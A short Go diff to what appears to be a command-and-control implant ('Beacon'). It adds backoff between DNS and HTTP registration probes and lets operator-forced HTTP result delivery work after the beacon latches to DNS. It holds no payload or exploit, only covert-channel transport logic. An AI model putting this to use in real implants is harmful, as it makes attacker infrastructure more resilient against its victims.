@@ -673,6 +673,11 @@ const dualProbeRetries = 3
 // single dropped packet does not wrongly mark a live transport dead.
 func (b *Beacon) probeRegistration(kind, checkInData string, regPhase PhaseConfig) bool {
 	for attempt := 0; attempt < dualProbeRetries; attempt++ {
+		// Back off between probes: three immediate attempts turn a listener that
+		// is still starting (or one slow DNS answer) into a permanent DNS latch.
+		if attempt > 0 {
+			time.Sleep(time.Duration(attempt) * time.Second)
+		}
 		var err error
 		switch kind {
 		case "dns":
@@ -721,7 +726,10 @@ func (b *Beacon) sendResultMessage(message string, phase PhaseConfig) (string, e
 	case "dns":
 		return b.client.sendPhaseCommand(message, phase)
 	case "http":
-		if b.transport == nil || b.transport.Mode() == transportDNS {
+		// Operator-forced HTTP must work even after a dual beacon latched to
+		// DNS: latching narrows check-ins, it does not remove the listener the
+		// operator explicitly asked to use for results.
+		if b.transport == nil || !b.transport.HasHTTP() {
 			return "", fmt.Errorf("result_transport=http, but this beacon has no HTTP transport")
 		}
 		timestamp := fmt.Sprintf("%05d", time.Now().Unix()%100000)
